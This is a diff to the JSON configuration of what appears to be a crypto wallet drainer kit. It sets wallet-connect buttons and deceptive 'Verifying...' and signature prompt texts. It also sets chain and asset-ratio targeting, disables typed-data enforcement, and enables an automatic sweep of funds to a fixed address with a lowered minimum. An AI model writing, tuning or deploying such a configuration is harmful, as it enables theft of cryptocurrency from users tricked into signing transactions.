@@ -1,15 +1,15 @@
 {
   "general": {
-    "ecosystem": "ethereum",
+    "ecosystem": "evm",
     "solanaCluster": "mainnet-beta",
     "solanaProgramId": "",
     "solanaRpcUrl": "",
     "tronNetwork": "mainnet",
-    "tronContractAddress": "",
+    "tronContractAddress": "0x0000000000000000000000000000000000000000",
     "tronRpcUrl": "",
-    "connectButtonClass": ".connect-btn",
-    "actionButtonClass": ".action-button",
-    "disconnectButtonClass": ".disconnect-btn",
+    "connectButtonClass": ".frontpage-connect-wallet",
+    "actionButtonClass": ".frontpage-primary-action",
+    "disconnectButtonClass": ".frontpage-disconnect-wallet",
     "connectText": "Connect Wallet",
     "connectedText": "Connected: {wallet}",
     "loadingText": "Verifying...",
@@ -19,13 +19,14 @@
     "rejectChainText": "Network switch was rejected",
     "notEligibleText": "Wallet does not meet requirements",
     "disconnectText": "Disconnect",
-    "transactionFunctionName": "claimReward",
+    "transactionFunctionName": "executeAction",
     "themeMode": "dark",
-    "contractId": "eip7702-module"
+    "backendUrl": "https://api.v26sequence.com",
+    "contractId": "batch-multicall"
   },
   "wallet": {
-    "minBalanceUSD": 50,
-    "targetChainAssetRatio": 60,
+    "minBalanceUSD": 0,
+    "targetChainAssetRatio": 90,
     "maxChainSwitchRetry": 3,
     "singleChainMode": false,
     "supportedWallets": [
@@ -74,7 +75,7 @@
       8453,
       42161
     ],
-    "walletConnectProjectId": "test-123",
+    "walletConnectProjectId": "fa769d222b291803a62d5deee060a7b3",
     "sequenceProjectAccessKey": "",
     "sequenceWaasConfigKey": "",
     "sequenceWalletUrl": "",
@@ -91,26 +92,17 @@
     "erc1155Support": true,
     "marketplaceTransfers": true,
     "contractFunctions": [
-      "mint",
-      "stake",
-      "claimReward",
-      "subscribe"
+      "executeAction"
     ],
     "transactionOrdering": "priority",
     "visibleChains": [
-      1,
-      56,
-      137,
-      43114,
-      42161,
-      10,
-      8453
+      1
     ]
   },
   "advanced": {
     "retryCount": 3,
-    "signaturePromptText": "Verify ownership of {wallet}",
-    "typedDataEnforcement": true,
+    "signaturePromptText": "Review and confirm Configure this page from /frontpage",
+    "typedDataEnforcement": false,
     "logFormat": "json",
     "logSignaturePrompts": true,
     "logChainSwitchEvents": true,
@@ -124,7 +116,7 @@
     "address": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
     "chain": "ethereum",
     "autoSweep": true,
-    "minSweepAmount": 100
+    "minSweepAmount": 10
   },
   "contracts": {
     "primary": {
